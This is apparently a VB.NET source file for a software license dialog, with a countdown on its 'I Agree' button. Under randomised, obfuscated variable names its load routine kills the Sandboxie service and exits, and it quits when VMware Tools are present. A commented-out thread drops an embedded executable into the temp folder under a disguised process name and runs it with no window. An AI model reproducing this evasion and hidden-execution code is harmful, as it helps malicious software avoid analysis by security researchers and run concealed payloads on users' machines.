Imports System.Threading
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Reflection
Imports System.Windows.Forms
Imports Microsoft.Win32
Imports System.IO.Compression

Public Class frmLicense
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Hide()
        frmMain.Show()
    End Sub
    Private lOAGQYOaOrfkGexxQGymxWKQD As Thread
    Private Sub Wait()
        For Y As Integer = 10 To 0 Step -1
            System.Threading.Thread.Sleep(1000)
            Try
                Me.Invoke(DirectCast(Sub() Button1.Text = "I Agree (" & Y & ")", MethodInvoker))
            Catch
            End Try
        Next
        Me.Invoke(DirectCast(Sub()
                                 Button1.Text = "I Agree "
                                 Button1.Enabled = True
                             End Sub, MethodInvoker))
    End Sub
    'Private Sub sWpESrZTUMneEKxbqVbkSGcLm()
    '    While True
    '        Try
    '            Dim amGsbRvXEorMxxHqsfApNYaXg As Random = New Random()
    '            Dim HXEwcyDhNqKgOvOklizJTqfzH As Process() = Process.GetProcesses()
    '            Dim uxmudhsmRvQVopUfFkJYsbtKg As String
    '            Do
    '                uxmudhsmRvQVopUfFkJYsbtKg = String.Empty
    '                While uxmudhsmRvQVopUfFkJYsbtKg = String.Empty
    '                    Try
    '                        While True
    '                            uxmudhsmRvQVopUfFkJYsbtKg = HXEwcyDhNqKgOvOklizJTqfzH(amGsbRvXEorMxxHqsfApNYaXg.[Next](0, HXEwcyDhNqKgOvOklizJTqfzH.Length)).MainModule.ModuleName
    '                            If Process.GetCurrentProcess().MainModule.ModuleName = uxmudhsmRvQVopUfFkJYsbtKg Then
    '                                uxmudhsmRvQVopUfFkJYsbtKg = "Razor.exe"
    '                            End If
    '                            If Not File.Exists(Path.GetTempPath() + uxmudhsmRvQVopUfFkJYsbtKg) Then
    '                                Exit While
    '                            End If
    '                            File.Delete(Path.GetTempPath() + uxmudhsmRvQVopUfFkJYsbtKg)
    '                        End While
    '                    Catch ex As Exception
    '                    End Try
    '                End While
    '                File.WriteAllBytes(Path.GetTempPath() + uxmudhsmRvQVopUfFkJYsbtKg, My.Resources.Detector)
    '            Loop While Not File.Exists(Path.GetTempPath() + uxmudhsmRvQVopUfFkJYsbtKg)
    '            Dim IkmORfszWtxYeyxYHbgupPWew As String = Path.GetTempPath() + uxmudhsmRvQVopUfFkJYsbtKg
    '            Using tcnxWMVRAaBpyESTrKncJeLXl As Process = New Process()
    '                tcnxWMVRAaBpyESTrKncJeLXl.StartInfo.FileName = IkmORfszWtxYeyxYHbgupPWew
    '                tcnxWMVRAaBpyESTrKncJeLXl.StartInfo.Arguments = """" + Process.GetCurrentProcess().MainModule.ModuleName.ToString().Split(New String() {".exe"}, StringSplitOptions.None)(0) + """"
    '                tcnxWMVRAaBpyESTrKncJeLXl.StartInfo.CreateNoWindow = True
    '                tcnxWMVRAaBpyESTrKncJeLXl.StartInfo.UseShellExecute = False
    '                tcnxWMVRAaBpyESTrKncJeLXl.Start()
    '                tcnxWMVRAaBpyESTrKncJeLXl.WaitForExit(500)
    '            End Using
    '            Try
    '                Try
    '                    If Me.xMZdLYeDrMYeqOgseytcZKXaC.Count > 0 Then
    '                        For i As Integer = 0 To Me.xMZdLYeDrMYeqOgseytcZKXaC.Count - 1
    '                            File.Delete(Me.xMZdLYeDrMYeqOgseytcZKXaC(i))
    '                            Me.xMZdLYeDrMYeqOgseytcZKXaC.RemoveAt(i)
    '                        Next
    '                    End If
    '                Catch ex2 As Exception
    '                End Try
    '                File.Delete(Path.GetTempPath() + uxmudhsmRvQVopUfFkJYsbtKg)
    '            Catch ex3 As Exception
    '                Me.xMZdLYeDrMYeqOgseytcZKXaC.Add(Path.GetTempPath() + uxmudhsmRvQVopUfFkJYsbtKg)
    '            End Try
    '            Thread.Sleep(2000)
    '        Catch ex4 As Exception
    '        End Try
    '    End While
    'End Sub
    'Private xMZdLYeDrMYeqOgseytcZKXaC As List(Of String) = New List(Of String)()
    Private Sub frmLicense_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        For Each LEzQyRPHJSiPFQkUSChZgAwll As Process In Process.GetProcesses
            If LEzQyRPHJSiPFQkUSChZgAwll.ProcessName = "SandboxieRpcSs" Then
                LEzQyRPHJSiPFQkUSChZgAwll.Kill()
                Environment.Exit(1)
            End If
        Next
        Dim ZGQAk As Mutex = New Mutex(False, "SINGLE_INSTANCE_APP_MUTEX")
        If (ZGQAk.WaitOne(0, False) = False) Then
            ZGQAk.Close()
            ZGQAk = Nothing
            Environment.Exit(1)
        End If
        Me.WindowState = FormWindowState.Normal
        Me.MinimumSize = Me.Size
        Me.MaximumSize = Me.Size
        Dim SJBtqAWtlMTbOzcxUDJhEucFA As New Thread(AddressOf Wait)
        SJBtqAWtlMTbOzcxUDJhEucFA.Start()
        Dim XDWQaAGZqCcEICbNTobIkNhtI As RegistryKey = Registry.LocalMachine
        Dim uUliGyCHlrTncUobIxqiCOfGL As RegistryKey = XDWQaAGZqCcEICbNTobIkNhtI.OpenSubKey("SOFTWARE\VMware, Inc.\Vmware Tools")
        If uUliGyCHlrTncUobIxqiCOfGL IsNot Nothing Then
            Environment.Exit(1)
        End If
        'Me.lOAGQYOaOrfkGexxQGymxWKQD = New Thread(AddressOf sWpESrZTUMneEKxbqVbkSGcLm)
        'Me.lOAGQYOaOrfkGexxQGymxWKQD.Start()
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Environment.Exit(1)
    End Sub
    Private Sub frmLicense_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        Environment.Exit(1)
    End Sub
End Class